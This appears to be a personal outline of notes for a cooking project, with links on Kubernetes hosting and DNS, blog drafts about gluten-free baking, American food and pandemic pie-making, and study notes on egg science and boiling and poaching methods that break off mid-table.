- #100DaysToOffload
- #gke
  collapsed:: true
	- [cheap gke hosting (25$ a month)](https://thenewstack.io/run-a-google-kubernetes-engine-cluster-for-under-25-month/)
	- [migrating to using spot instaces gke](https://spltech.co.uk/how-i-migrated-all-my-websites-to-google-kubernetes-engine-on-the-cheap-using-spot-vms/)
- #dns
  collapsed:: true
	- for github pages, it is [required to have a CNAME](https://docs.github.com/en/pages/configuring-a-custom-domain-for-your-github-pages-site) for the root of the domain that points to `<username>.github.io` google domains does not let you do this, you should use [cloudflare](https://cloudflare.com) instead of google's dns
	- [a nice site](https://www.whatsmydns.net/#A/breadchris.com) to check a bunch of different regions for how they see your DNS
- #electronics
  collapsed:: true
	- electronics demonstrations - https://www.falstad.com/circuit/e-index.html
		- really really cool resource for how different circuits work with the different laws
- #cookwherever
  collapsed:: true
	- ingest the new dataset from the [fda food db](https://fdc.nal.usda.gov/download-datasets.html)
	- ### things to develop
	- update recipe saver to have a better ui, friendly for bloggers
		- https://www.recipesgenerator.com/start
	- contact local magazines and give them ability to register local farms that grow produce and give the recipes that include those ingredients to include in their newspaper
	- monitor dashboard
		- https://monitoror.com/documentation/#http
	- ### things to write about
	- [perfect burger](https://www.youtube.com/watch?v=ZorUPMeKgh0)
	- [egg yolks](https://www.youtube.com/watch?v=KL4PDa6PpLQ)
	- [no waste cooking ideas](https://savethefood.com/recipeslisting/scraps?id=24)
	- [food waste reduction - cornell](https://ccetompkins.org/food/healthy-people-healthy-planet/food-waste-reduction)
	- [what are CSAs?](https://eatlocalfirst.org/csa/)
	- #cookwherver/recipes
	  collapsed:: true
		- [hn discussion for scraping recipes](https://news.ycombinator.com/item?id=23142220)
		- [how to choose recipes - oregon state 4h](https://catalog.extension.oregonstate.edu/sites/catalog/files/project/pdf/4-h93112.pdf)
	- #[[cookwherever/gluten free]]
	  collapsed:: true
		- I have gone through a number of gluten-free resources at this point ranging from random online blogs to Modernist Bread's 5 volume set on everything bread. There are a lot of patterns in these books and I hope to distill the information that I have found useful in my gluten free journey.
		- ATK How could it be gluten free
		- Modernist bread
		- Gluten free bread in 5
		- Promises kept or whatever it is called
		- Modernist pantry
		- That research book by the food coalition
		- It was pretty mind blowing when I realized that all gluten-free recipes are just trying to replicate the unique properties of wheat flour and the gluten that is formed when water is added. In this post I want to outline what wheat flour brings to the table, and then what elements go into a state of the art gluten-free bread recipe to replicate this behavior.
		- Gluten-Full Bread Properties
		- Gluten-Free Elements
		- Flours
		- Starches
		- Binders
		- Gums
		- Enzymes
		- While my body requires me to be as gluten-free as possible, I find gluten-free baking as an exciting challenge to push the limits of what we can do as bakers to make something that you can slather jam on or use to complete your favorite sandwich. I personally eat a number of things that I prefer to their gluten-full counterparts, but unfortunately there is a pretty big stigma around gluten-free products just "not being good". I task all the bakers reading this to break down this precognition by baking for your friends and surprise them when they are five cookies deep by telling them what they ate was gluten-free.
	- #cookwherever/stores
	  collapsed:: true
		- https://www.supermarketnews.com/retail-financial/top-50-food-and-grocery-retailers-sales
	- #cookwherever/ingredients
	  collapsed:: true
		- National Agriculture Statistics Service - https://quickstats.nass.usda.gov/
		  * visualization: https://harvest.datasupply.co/
		  * explaination: https://medium.com/typecode/designing-a-data-visualization-for-local-seasonal-produce-harvests-12f8b689b584
		- https://www.slowfoodseattle.org/volunteer
		- [usda market data for vegetables & pulses](https://www.ers.usda.gov/topics/crops/vegetables-pulses/)
		- [usda stats by state](https://www.nass.usda.gov/Statistics_by_State/)
	- #cookwherever/substitutions
	  collapsed:: true
		- Collection of substitions - http://www.foodsubs.com/
		  Ingredients can be substitued, but their functional purpose, as they relate to the recipe are very important. Using milk and vinegar instead of buttermilk is generally ok, however if a lot of buttermilk is required, then the resulting flavor might be off.
	- #cookwherever/techniques
	  collapsed:: true
		- * Anova Times and temperatures: https://anovaculinary.com/anova-sous-vide-time-temperature-guide/
		- * Americas Test kitchen
		  * Kenji Lopez-Alt Youtube
	- #cookwherever/recipes
	  collapsed:: true
		- Recipe 1mil - http://pic2recipe.csail.mit.edu/
		- Cullinary School - https://forums.egullet.org/ (also contains techniques)
		- Americas test kitchen
		- Serious Eats
		- New York Times
		- Epicurious
		- Joshua Weissman
		- https://www.epicurious.com/recipes-menus/cocktail-recipe-finder-article
	- #cookwherever/guides
	  collapsed:: true
		-
		- # American Cooking Basics
		  
		  There are a number of meals that people regularly eat in America. Whether it is something you eat when you are pressed for time (which it seems like we always are) or preparing a meal for a special occasion. In both of these cases, eating something that turns out poorly is not a fun time and can discourage us from trying it again. 
		  
		  Going down my own home cooking journey has led me to find a number of incredible resources from random blog posts to terse cookbooks that read more like textbooks. It is only through reading and then applying the skills I read about did things really start to click for me of how easy it really can be to whip something together to eat.
		  
		  Recipes are amazing at guiding you through how to start with ingredients and sequentially put them together, but without really thinking about what you are doing, you are probably not going to become a "better cook". I really hope through this list of American food basics that you aren't just blindly following what is in the recipe, but rather using all of your senses to understand the transformation that your ingredients go through when you put them together in a recipe. I personally find it super liberating to be able to travel anywhere and be able to work with whatever I have on hand and not having to be dependent on specific amounts of a specific ingredient as far too often you cannot find every ingredient in a list.
		  
		  These recipes also encourage you, when you have the time/equipment for it, to try out different techniques for preparing them. For example, did you know you can make scrambled eggs with a plastic bag, water, and precision cooker (otherwise known as _sous vide_ which is literally just a more powerful fish tank heater)? Understanding the different ways you can make these basic recipes will make you more versatile and allow you to confidently cook in any situation.
		- ## Breakfast
		- ### I got to run
		  * Toast
		  * Sunny Side Up
		  * Scrambled
		  * Poached
		  * Bacon
		- ### I have time / I have people over
		  * Hard / Soft Boiled
		  * Omelet
		  * Eggs Benedict
		  * Hash Browns
		  * Potato Hash
		  * Pancakes / Waffles
		  * Biscuits
		  * Cinnamon / Sticky Buns
		- ## Lunch
		- ### I need to pack my lunch now
		- ### I am packing my lunch ahead of time
		- #### Grains / Legumes
		  * Rice
		  * Quinoa
		  * Beans
		  * Lentils
		- ### I am at home and have time
		- ## Dinner
		- ### I just had a long day
		- #### Main
		  * Roasted Chicken
		- #### Side
		  * Mashed Potatoes
		  * Cole Slaw
		- ### I want to do something special
		- #### Main
		  * Pizza
		- #### Side
		  * French Fries
		- ## Dessert
		- ### I want myself some sugar ASAP
		  * Cookies
		  * Brownies
		- ### I want something fancy
		  * Pie
		- ## Things to Keep Around
		- ### Bread
		  * Sandwich
		  * Sourdough
		- ### Stock
		  * Chicken
		  * Vegetable
	- #cookwherver/ideas #blog/ideas Why people don't cook more
	  collapsed:: true
		- * "upfront cost" - https://www.reddit.com/r/Cooking/comments/teo7l9/why_do_some_people_act_like_cooking_is_more/
		- So I have been cooking for a while. Well not that long when you look at how many days I have been on this earth, but it feels like a while. I started cooking during covid when there was nothing else to do but be inside. But the thing is, I am an engineer. Like pretty nerdy, tech bro kind of engineer. And to me, good cooking was an art. It was something that felt unobtainable. How could I ever eat a hamburger I could make myself that was as good as McDonald's Quarter Pounder? I would make myself burgers, but they were always dry. McDonalds must just know how to do it better than me. It was a special occasion for me to go eat out. And when I did, it was something super special. The food that I would get was nothing that I had ever been able to make myself. Going to the grocery store, they had foods that I didn't have the slightest clue how it was made. Bread? I had hardly ever had a good muffin I made myself, let alone a whole loaf of bread.
		- I would watch Chef Ramsey, Martha Stewart, and Racheal Ray in perfectly manicured sets, ingredients mise en place, ready to be simply dumped in while they recite the recipe they have learned from their Grandma or inspired by a friend who runs Spain's most famous restaurant. A knife can cut through their tomato that easily? The inside of that steak is that red? Jesus christ, how the hell did they make that happen.
	- #cookwherever/ideas #blog/ideas How did American food come to be?
	  collapsed:: true
		- America is having an identity crisis. A powerful force on the world stage, but still very much a "startup" of a country. An ambitious youth that rebelled against its parents and left the house to make a difference in the world. The promise land for those around the world want better for themselves and their family.
		- The sole existence of the US was to fight tyranny. Decisions made by one person tend to not work out the best for everyone over time.
		- "We are going to build massive prisms in the dessert that will last longer the gods themselves" "Who is going to build them?" "The slaves of course!"
		- American cooking is interesting. Rapid expansion and a tenacious work ethic from immigrants pouring into the US defined american cuisine. Fast food, across the world, is directly associated with the US. Meat was and is the main ingredient of choice for the busy family. Dense in calories, easily frozen, delicious when cooked, it is no surprise that this is the case. Being very easy to come by in the sprawling farms across the country, access to this food was easy.
		- Health wise, there could be better ingredients you turn to when planning your meals long term.
		- When I think of breakfast in the US, it is hard not to think about diners. Polished chrome, pastel green, blue, red, a family outing, a late night oasis for the lonely traveler. Diners perfectly capture the relationship between Americans and food. Large portions of potatoes, eggs, bacon, pancakes, coming out as quickly as you can say "2 stack with sausage".
		- What has really interested me with cooking is the actual raw ingredients that come from the ground. Growing up drinking cherry "flavored" Capri sun from a plastic pouch, I LOVED these drinks. It was a privilege to have these in our lunch or at sports games. But, for some reason, I didn't like cherries themselves. They just didn't have any flavor and it was so much work to pit them. Who would eat these? Well, it turns out the cherry flavoring is really a chemical that was developed in a lab to replicate what a cherry AT ITS BEST tasted like. I had never seen a cherry tree before. I didn't grow up watching the small bulbs appear on the tree and over time turn into succulent deep dark red cherries. I didn't understand that fruit had a SEASON. A fleeting moment during the summer when a cherry was filled with sweet sugar bestowed upon it from the tree on which it grew. Taking the cherry too early, and there is no sugar, too late and they have fallen to the ground where the earth eats them up. But, there are cherries in supermarkets? Yes, but HOW DID THEY GET THERE. Most cherries in the US come from X. For them to be transported from there to Maryland where I lived would be X miles. From picking the cherries to them being bought by me and eaten, it probably would have been about 2 weeks.  Over that time, the cherries are losing their flavor to the natural chemical reactions that occur when you throw time at them. I would rather have the potent chemical cherry flavor over the vaguely cherry sacks of water, thank you.
		- So why do people like cherries? Well, as I found out later in life, these people seek out farmers or more local farmers markets where the cherries have been picked the day before. All the flavor is still there. What the cherry flavor is based on, but couldn't hold a candle to, is in these freshly picked cherries. Plump skin that gives way and releases the complex flesh of sweet and sour is what a cherry should be. If you haven't experienced this in a cherry, you haven't had one yet.
		- The US is INCREDILY good at making anything you could dream of available to you within an arms reach. The X from the USSR visited an Aldis in Texas and said that the head of the USSR doesn't even have this access to a variety of food.
		- What supermarkets can't deliver  to you fresh, they have a well researched recipe that employs the latest in food science to make sure it can sit in a warehouse for weeks before it ends up on the shelve to be bought. Wheat is one of the most researched ingredients since bread is so integral to an American's diet. Additives preserve a loaf of bread far longer than a fresh load made of only flour, water, yeast, and salt ever could. Check the freezer isle next time you are in a grocery store, you might find some bread that comprises on covienience for the sake of simple ingredients.
		- When you can buy anything you could dream of, you don't question what it is. Unfortunately, when you don't have someone who is fighting for your taste buds, you are going to get the person who is fighting for more money. The person who is in it for money, is probably going to create a product that appeals to our primal senses, without a care for how healthy it is. Loading cookies with fat and sugar is an easy way to sell more cookies. No lemons? No problem, let's mix some mouth watering citric acid and way too much sugar and call it lemonade. People will buy it.
		- Grocery stores have changed for me. I don't walk through every asile anymore. I have actually realized that the dazzling display of colors, logos, brands that make up the aisles are pretty overwhelming! That is a TON of information to process, let alone when you find what you are looking for and there are 20 different versions and brands to choose from. Grocery stores for me are a couple of aisles. They are the ones with the raw ingredients. Vegetables, fruit, butter, milk, eggs. Cereal aisle? Are you kidding me? Who thought an entire section devoted to a bowl of sugar was a good idea? Oh right, the people fighting for money. The chip, soda, candy aisles I go to once in a while if I want a snack. But wow! There are so many! And in such large quantities.
		- I want to change what America is known for when it comes to food. I don't want to change what food we make, I love it (waiter, another cheese burger please). I want to change how we make it. What ingredients are we using? Where do they come from? Are there steps we can take while preparing the food that make it turn out 1% better? Can we take shortcuts without the expense of someone's health? Lets weaponize our powerful food distribution system to incentivize fresh, local produce that reduces the energy needed to have it delivered. If we harness the power of the community to put a demand on quality, we redirect the efforts of the people who are in it for money. The organic movement in grocery stores is a testimate to the power of consumer demand, however it isn't without its draw backs. Being labeled as "organic" is an expensive process that small local farms simply can't afford.
		- I don't want to give you recipes in this book. There are so many out there, and some of them are probably better than the ones I have here. In fact, I don't even want you to follow the recipes from this book. I would rather you use the site I put together, but hey I totally get wanting to unplug from a screen and follow words on a page (I do all the time). What I want you to do with this book is glance at it from time to time. Read the table of contents, twice, and slap the book shut, put it on your shelf, and go about your day, month, year, life. I want you to order fast food, make pasta, go to a restaurant, order food from a food truck. And while you are doing this, be curious, be present. "Oh baby these bbq wings SLAP! But what did they put in here?" If you find yourself asking these questions, remember back to this book and the fact that there is a bbq wing recipe. If you are compelled to go back home and read the section on bbq wings, it will not disappoint. You may not learn how to replicate those wings EXACTLY, but you will learn how to make wings that SLAP, I guarantee it. Make them for yourself, your friends, your partner, your family, and see how they react. My mom had a saying when something turned out well: "restaurant quality". Every recipe in this book is "restaurant quality", and I give you a number of ways to achieve that. Are you in a pinch and need it done quickly? I'll show you how to make those eggs turn out the best they can without even thinking about it.
		- You are going to make mistakes, that's ok. I tried my best to capture all the ways something can go wrong and how to recover. I love the idea of a "foolproof" recipe where there is very little room for something to get messed up. Checkpoints and observations you can make break up each step into a very straight forward process. Unfamiliar with a referenced technique? No problem, every special cooking technique is explained in detail.
		- Being a teacher, I understand how important it is to address the different types of learning resources that people need. Sometimes you want to read, watch, or listen. Every recipe has (obviously) written directions, but also a video you can watch. If you follow the recipe in the app, the video is broken up into each step so you can watch it as many times as you need to.
- #sogoodicouldpie
  collapsed:: true
	- seasonal:
	  * passion fruit curd pie
	  * peanut butter and concord grape pie
	  * crab apple rose pie
	  * mulled wine quince pie
	  * apricot, vanilla bean, and cardamom
	  * cape gooseberry elderflower meringue
	  * red currant and fig
	  * sable breton tart with cranberry curd
	  
	  anytime: 
	  * coconut cream pie
	  * key lime pie
	  * banoffee pie
	  * ricotta lemon-thyme pie
	  
	  linzertorte
	  fig, cherry, and walnut tart
	  chocolate-hazelnut raspberry mousse tart
	  rich chocolate tart
	  chocolate, matcha, and pomegranate
	  triple berry slab pie with ginger-lemon streusel
	  fried peach hand pies
	  chocolate cherry pie pops
	  apple butter pie pops
	  north carolina lemon pie
	  new england mincemeat pie
	  floria sour orange pie
	  maple syrup pie
	  chocolate haupia cream pie
	  french coconut pie
	  viginia peanut pie
	  mississippi mud pie
	  lemon ice box
	- #blog/ideas Quarantine Pies
		- A little over a year ago, I really would not call myself a baker. Baking to me was going to our grocery store, going into the baking aisle, and picking a Betty Crocker mix to throw into a bowl with oil and eggs. It wasn't until Thanksgiving of 2019 that I attempted something as daring as making a pie from scratch. 
		  It was an apple pie, and I remember the recipe distinctly because it didn't call for mixing the sugar mixture in with the apples, but putting the sugar mixture over top of a fully assembled pie (with the dough sealing in the raw, sliced apples). Even though I had never made an apple pie, I of course had eaten a lot apple pie and knew the way it was supposed to look, and looking at the sugar mixture sitting on top, slowly oozing its way through cracks it could find between the apples looked odd. But I was committed to making this pie and so I threw it into the oven and awaited the results of my creation. Even before it was done, the entire house had swelled with the smell of cinnamon, butter and apples; the smell that anchors your consciousness in childhood memories of playing in leaves, pumpkin picking, family gatherings where everyone is smiling and having a good time (and definitely not at each other's throats over some small argument). Coming out of the oven, the pie looked magnificent, I was thoroughly surprised. I had no expectations for how it would turn out, but I felt pretty good about it for my first attempt. The sugar on the top had caramelized (not that I even knew what the word 'caramelized' even meant at this point) giving the top an interesting texture along with the dough.
		  
		  I don't remember how the pie actually turned out, or if it even tasted good by my standards for pie today, but I definitely remember enjoying it thoroughly.
		  
		  Up until this point I wouldn't say I was really "into pies" but this definitely flipped a switch within me to dive deeper into exploring this newfound love of circular baked goods filled with fruit. I found myself doing extensive research into what apple pie recipes existed online and would occasionally try one out when I read about a different technique for preparing one (ex. cooking the apples on the stove before putting them in the crust, using different kinds of apples, etc.). Baking began to feel more of a research project than making something to satisfy my craving of sugar and butter.
		  
		  March 14, 2020 was coming up (otherwise known as 'Pi' Day as the numerical date is 3/14 or 3.14), and being the nerd that I am, I decided to have some fun with it this year. At this point I was set on eventually making the best apple pie the world had ever seen, and so Pi Day was the perfect time to make some pies and collect some data from my test subjects (this was not an approved human research study, but full consent was received from my friends and they were compensated with pie). Me and one of my friends put together 13 pies with the intention of answering the questions: What is the best configuration of apples? Does it make a difference to cook the apples before they are put into the oven? Do people like the drier filling caused by baking a pie with a lattice top vs a fully closed top? I collected some data, but I realized that it was not a study that would produce conclusive results as there was no control pie and I wanted to answer too many questions at once. What I did realize though, was that different people definitely had their own individual preferences and making a "perfect pie" isn't so much as making a silver bullet as it is tailoring a pie to someone's pallet. 
		  
		  After Pi Day, I went on my annual spring trip home and ended up staying longer than expected due to the Covid pandemic quarantine. Now, being told to stay inside all day,  having full reign over my parents newly renovated kitchen, and a full house is the perfect recipe for making and eating lots of pies. I made every configuration of apple pie I could find a recipe for or think of: gluten-free apple pie, keto(-ish) apple pie, candied ginger apple pie, apple pie in a cast iron, and a number of others that I gave to those fighting Covid.
		  
		  The creativity cloud burst when I found America's Test Kitchen's - The Perfect Pie. It became my sacred text. It had every pie I had ever heard of and then a whole swath of others ranging from French tarts to regional US favorites. It reshaped what a "pie" was for me. I wanted to make all of them
		  
		  Whenever I had the opportunity during the quarantine to travel to another bubble of people I insisted that I made them a pie. Up and down the east coast I tried to make a pie that was related to that region. I picked apples at my friends farm in Albany, made a cheddar cheese crust in the Poconos, brought a Dutch apple pie to my friend's Pennsylvania proposal, and baked a Tar Heel pie in the Outer Banks. When I got back to the Pacific North West, I foraged for blueberries to use in a blueberry pie, cut off some rhubarb and strawberries in my friends garden. And of course there are opportunities for word play with pies like: having a Baked Alaska in Alaska and a Turkey Pot Pot Pie for Thanksgiving (a mind blowing flavor experience). My friends and I had a Michelin Star Restaurant night where we all dressed up and each put together the fanciest thing we could prepare. My contribution was a lavender creme brule pie which I finished on the table with a blow torch.
		  
		  Pies are a dessert meant to be shared. They can bring people together for a meal with the promise of having a special dessert. There is a stark difference between a Sarah Lee pumpkin pie and one that you have made from fresh pumpkins that you have picked from a farm, and people can taste the difference. A pie becomes special when you can feel its flaky crust and its fresh filling. Someone who isn't a pie connoisseur will notice when compromises have been made in the baking process.
		  
		  I would probably say that I am a "baker" at this point, but I am still a long ways from my goals with baking. Stay tuned for more pie related posts on this blog :)
- #thefoodlab/chapter1
  collapsed:: true
	- # 1 Eggs, Dairy, and the Science of Breakfast
	- ## Eggs
	- ### yolk
	  * 75% of calories in an egg
	  * Biologically they are sacks of water with dissolved proteins and larger masses of protein and fat linked together with lecithin
	  * Lecithin is an emulsifying molecule which allows fat and water molecules to exist near each other without separating.
	- ### white
	  * Mostly water with few proteins: Ovalbumin, Ovomucin, Ovotransferrin
	  * Proteins let egg white be whipped and come set when cooked (think of meringue)
	  * These proteins compared to others, such as those found in meat, are already dissolved in a liquid (there is a lot of water in an egg). This allows them to be easily included in other foods (gluten-free breads benefit from the structure these proteins provide when heated).
	  * Each protein reacts differently to heat allowing control over the resulting texture when cooking. 140 degrees F is soft and custard like and 180 degrees F is bouncy and firm
	- ### sizing
	  * USDA sizing standards for minimum weight per egg
	  * Jumbo - 2.5 oz
	  * Extra large - 2.25 oz
	  * Large - 2 oz
	  * Medium - 1.75 oz
	  * Small - 1.5 oz
	  * PeeWee - 1.25 oz
	  * In larger eggs are more likely to find a double yolk
	- ### grades
	  * USDA grading standards
	  * AA - firmest whites, tallest standing yolks, cleanest shells
	  * A - Somewhere between AA and B
	  * B - Watery whites, flat yolks, stained shells
	  * For preparing dishes with eggs as the focal point, a high quality 
	  egg is preffered. When used in baking, the grade will not affect
	  the result.
	- ### Regulated Chicken Conditions
	  * Natural / Farm Fresh - No regulated guaruntees
	  * Free-Range, Free-Roaming, and Cage Free - Chickens are kept in large open barns/warehouses, not battery cages. More room for chickens to do things that they natually do. Labels are not audited, relying on producer to tell the truth.
	  * Certified Organic - Kept in open barn or warehouse, possibly outdoor access. Must be fed organic, all-vegetarian diet without animal by-products, antibiotics, and pesticides. Label is audited by USDA.
	  * Certified Humane - Third-party auditor enforces limits on stocking densities.
	  * Omega-3-Enriched - Chickens are fed supplements from flaxseed or fish oil.
	- ### freshness
	  * The fresher the egg, the more intact a yolk and white will be as the
	  proteins have not had as much time to break down.
	  * To test how fresh an egg is, you can use a bowl of water and observe if it floats. If it floats then it is most likely bad and should not be used. Eggshells are porous and will lose water being in the fridge, a dehumidifier. The evaporated water will be replaced by air between the shell and the inner membrane near the end of the egg where the fat is stored. When the egg is fresh, this air pocket is small, but grows with time until it becomes large enough to cause the egg to become boyant in water.
	  * Aging eggs become more [alkaline](source), or basic, and can affect recipes which
	  are affected by the pH of ingredients. In a meringue, the egg whites
	  are whipped into stiffer peaks by a slightly acidic environment. 
	  If the combined ingredients are not acidic enough, which can happen 
	  with older eggs, the resulting mergine will be wet and more of a liquid.
	  Cream of tartar is used to make the combined ingredients more acidic and
	  counter this effect.
	  * Myth: Older eggs are easier to peel after they have been boiled.
	  False: Older eggs simply produce less attractive boiled eggs as the yolks
	  become uncentered in the egg.
	  * An egg can be safely used 60 to 70 days after the pack date. 
	  * The pack date is a more reliable method for determing how old an egg is. The pack date is a three-digit number directly above the sell-by date. The three numbers indicate the day of the year that it was packed on (ie. 001 is January 1st and 365 is December 31st). While it is not possible to determine exactly what day the eggs were laid, legally manufacturers have up to 30 days to clean and pack eggs. After this pack date, the sell-by date can be set up to 45 days later. Considering both these dates, buying a carton of eggs on their expiration date means they could be up to 75 days old.
	  * The cuticle of an egg is a thin, wax-like coating that exists on the egg when it is first laid. This is a protective coating for the incubating chick which prevents bacterial infection and moisture loss (since the shell is pourous). In the United States, USDA-stamped eggs have the cuticle removed before they are packed. With this protective layer removed, refrigeration is imparative to keep out bacterial infection. In farmers markets or Euorpean stores you can find this cuticle kept intact and eggs can be kept safely at room temperature.
	  * Pasturized eggs have been submerged in a 130F water bath for long enough to kill harmful bacteria 
	  * Color of an eggshell (white or brown) comes from the different breed of chicken.
	- ### boiling 
	  * Definition: When vapor pressure of a liquid is greater than or equal to atmospheric pressure that surrounds it.
	  * Analogy: Water is made of molecules, in the same way a crowd at a concert is made of people. At a concert with a single piano player playing a soft ballad, the crowd will be silently listening, sitting in their seats. Replace this piano player with chaotic energy of a Van Halen solo shredding on his guitar, and the crowd will start to become active and possibly start _moshing_ or violently running into and pushing each other. If these enthusiastic concert goers are bound by some sort of barrier, it is possible they might break free and move into other parts of the venue. In a pot of water, it might not be obvious, but there is a barrier keeping these water molecules from escaping and it is the pressure from the atmosphere pushing down. As you add heat to the bottom of the pot, the water molecules nearest to the source of heat, just like people closest to the speakers at a concert, will start to get excited and bump into other molecules. Once the molecules all the way in the back, or at the top of the pot, start to get really excited, they break free and _evaporate_ in the form of steam or water vapor. Seeing their molecule friends escaping, the rest of the water in the pot starts to do the same. The temperature that water does this is at 212F or 100C. 
	  
	  | Name | Temperature Range | Description |
	  |------|-------------------|-------------|
	  | Quivering | 130F - 170F | Small bubbles of water vapor form at nucleation sites at the bottom of the pot. Surface of water quivers from bubbles attempting to surface, but not quite getting there. |
	  | Subsimmer | 170F - 195F | Small bubbles from the bottom and sides rise to the surface. Streams of small bubbles look like a champagne in a glass. |
	  | Simmer | 195F - 212F | Bubbles break surface of water regularly from all parts of the pot. |
	  | Full boil | 212F | Water vapor escapes rapidly and pot cannot get any hotter. A pressure cooker can increase the temperature beyond this point. |
	  
	  * To more easily peel eggs, lower them into already boiling water instead 
	  heating them from cold water. Eggs peel more easily when their proteins 
	  are not bound to the shell.
	  * Types
	  * Hard-boiled
	  * White: Set, not rubbery
	  * Yolk: Bright yellow and creamy yolk, not chalky or crumbly.
	  * Soft-boiled
	  * White: Set white
	  * Yolk: Liquid, ooze like custard
	- ### Heat and Eggs
	  
	  Cooking eggs is crazy, there are so many ways to do it! We can thank the fact that there are so many different proteins which all respond to heat differently. Because of all the moving parts an an egg, time and temperature are very imporant to keep track of if you are looking to make the best eggs you have ever had.
	  
	  ![unraveling of egg protein](https://static01.nyt.com/images/2020/06/09/science/09SCI-MUNROE-EGG2/09SCI-MUNROE-EGG2-articleLarge.jpg?quality=75&auto=webp&disable=upscale)
	  
	  > Proteins are essentially coiled balls of yarn. When you introduce them to heat, they start to unravel. Just like a box full of unravelled yarn, the unravelled proteins will overlap each other and create a thick mess. We call the process of a protein unravelling, *denaturing*. I like to think of all of these unravelled proteins as "chemistry noodles".
	  #### Egg White and Temperature
	  What happens to the egg white as heat increases.
	  
	  | Temperature Range | Description |
	  |-------------------|-------------|
	  | 30F - 140F | The egg white's proteins begin to denature. |
	  | 140F | _Ovotransferrin_, a protein in the white, starts to unravel and bonds to itself. The result is a matrix of proteins which makes the white milkly and jelly-like. |
	  | 155F | _Ovotransferrin_ becomes an opaque solid. Egg white is soft and moist. |
	  | 180F | _Ovalbumin_, the main protein in the egg white, will cross-link and solidifiy. The egg white becomes firm, but remains tender. |
	  | > 180F | As temperature increases, the proteins will bond more tightly and will wring out water from the egg like when squeezing a wet towel. Hydrogen sulfide, or the "rotten egg smell", will form and your eggs just aren't going to smell good. |
	- #### Egg Yolk and Temperature
	  What happens to the egg yolk as heat increases.
	  
	  | Temperature Range | Description |
	  |-------------------|-------------|
	  | 145F | The proteins being to denature, making the yolk thicker. |
	  | 158F | Egg yolk is dark, translucent, and firm. Texture is like fudge. It can be cut with a fork. |
	  | 158F - 170F | Yolk becomes firmer until it turns pale and crumbly. |
	  | > 170F | More and more crumbly. The sulfer in the egg white and iron in the yolk react and create _ferrous sulfide_. This molecule makes the outside of the yolk turn slightly green.
	- ### Foolproof Soft-Boiled Eggs
	- #### Concepts
	- #### Ingredients
	  * 1 qt water for every 2 eggs
	  * 1 to 12 large eggs
	- #### Equipment
	  * Lidded saucepan (or pot) - small enough that the eggs will be fully submerged when you add them to the water.
	- #### Directions
	  1. Boil water. 
	  2. Add eggs.
	  3. Cover the pan.
	  4. Remove from the heat.
	  5. Cook the eggs according to the times given in the chart.
	  6. Remove eggs with a slotted spoon.
	  
	  | Cook Time | Description | Best Uses |
	  |-----------|-------------|-----------|
	  | 1 to 3 minutes | Outer white set just enough to allow egg to retain its shape when carefully peeled | Salad or pasta where the uncooked egg will emulsify with other ingredients; they’re not pleasant to eat on their own. |
	  | 4 minutes | White is opaque nearly all the way through but retains a bit of translucency next to the yolk; yolk is barely warm and completely raw | Serve as a topping to vegetables or grains; place on top of blanched asparagus or green beans or in a bowl of noodle soup. |
	  | 5 minutes | White is opaque but still quivering and barely set toward the yolk; yolk is warm but completely raw | Breakfast |
	  | 6 minutes | White is opaque, firm all the way through; yolk is warm and starting to firm up at the edges | Breakfast |
	  | 7 minutes | White is fully cooked and as hard as that of a hard-boiled egg; yolk is golden and liquid in the center but beginning to set around the edges	| Breakfast |
	- ### Foolproof Hard-Boiled Eggs
	- #### Concepts
	- #### Ingredients
	  * 2 qt water
	  * 1 to 6 large eggs
	  * 12 ice cubes
	- #### Equipment
	  * 3 quart saucepan - Using a different sized pan will change the times. It is recommended that you make a test first if using a different sized pan.
	- #### Directions
	  1. Pour the water into the saucepan.
	  2. Boil water.
	  3. Lower the eggs, carefully, into the water.
	  4. Cook for 30 seconds.
	  5. Add ice cubes.
	  6. Wait for water to return to a boil.
	  7. Reduce to a subsimmer, 190F.
	  8. Cook for 11 minutes.
	  9. Drain the eggs.
	  10. Peel under cool running water.
	- ### Poached Eggs
	- #### Concepts
	- ##### Egg White "Floaters"
	- ##### Storing for Later
	  To serve eggs later, place in bowl with cold water so that the eggs are all submerged. Place bowl in refrigerator, they will stay good for up to 3 days. To reheat, place in bowl of hot water for 15 minutes.
	- #### Ingredients
	  * 3 quarts of water
	  * 2 tbsp kosher salt
	  * Large eggs (as many as desired)
	- #### Equipment
	  * Bowl
	  * Plate
	  * Paper towels
	  * Large saucepan
	  * Spoon large enough to hold an egg
	- #### Directions
	  1. Add water and salt in a large saucepan.
	  2. Boil water.
	  3. Reduce heat to lowest setting.
	  4. Crack an egg, carefully, into the bowl.
	  5. Pour the egg, carefully, from the bowl into the large spoon.
	  6. Gently lower the spoon into the boiling water.
	  7. Tilt the spoon so that the egg slides off of the spoon and into the water.
	  8. Wait.
	  * Time: 4 minutes.
	  * Until: the egg whites are fully set.
	  * Also: Swirl the water occasionally so that the egg moves around slightly.
	  * Also: Line a plate with paper towels.
	  9. Using the spoon, scoop the egg out of the water and place on paper towels to drain.
	  10. Repeat 4 - 8 with the rest of the eggs.
	- ### Clarified Butter
	  // TODO
	- ### Hollandaise Sauce
	- #### Concepts
	  // TODO
	- #### Ingredients
	  * 3 large egg yolks
	  * 1 tbsp lemon juice (from 1 lemon)
	  * 1 tbsp hot water
	  * 1/2 lb (2 sticks) unsalted butter
	  * Prep: cut into rough tablespoon-sized chunks
	  * Optional: Pinch of cayenne pepper
	  * Kosher salt
	- #### Equipment
	  // TODO
	- #### Directions
	  If using immersion blender:
	  1. Add egg yolks, lemon juice, and hot water into blender cup.
	  
	  If using blender or food processor:
	  1. Add egg yolks, lemon juice, and hot water into blender or food processor.
	  2. Blend on medium speed until smooth
	  * Time: 10 seconds.
	  // TODO
	- ### Eggs Benedict
	  // TODO
	- ### Eggs Florentine
	  // TODO
	- ### Fried Eggs
	- #### Concepts
	  How do we have an egg white come set, which happens at around 155F, but the not overcook the egg yolk, which will start to become firm at 145F? Cooking two things at the same time with the same heat source is tricky, but thinking about chemistry and thermodynamics for a second (I promise it isn't anything too crazy!) we can figure out how to make the perfect fried egg.
	  
	  Refering back to what we know about the chemistry of eggs, the yolk is filled with fat. Animals that live in cold climates use fat to keep themselves warm since fat is a good _insulator_. A good insulator will change temperature more slowly than a poor insulator, meaning it will become cold slowly _and_ become hot slowly. In science terms, an insulator transfers energy very inefficiently, or it is a poor _conductor_.
	  
	  Additionally, if cracked carefully into the pan, the yolk will sit _on top of_ the white. All of the heat that the yolk will be affected by will have to go through the egg white first. Our egg white will also act as an insulator for our yolk!
	- #### Effect of Temperature on an Egg in a Pan
	  
	  Let's take a look at what would happen if we put an egg in a pan heated to different temperatures.
	  
	  | Temperature | Affect |
	  |-------------|--------|
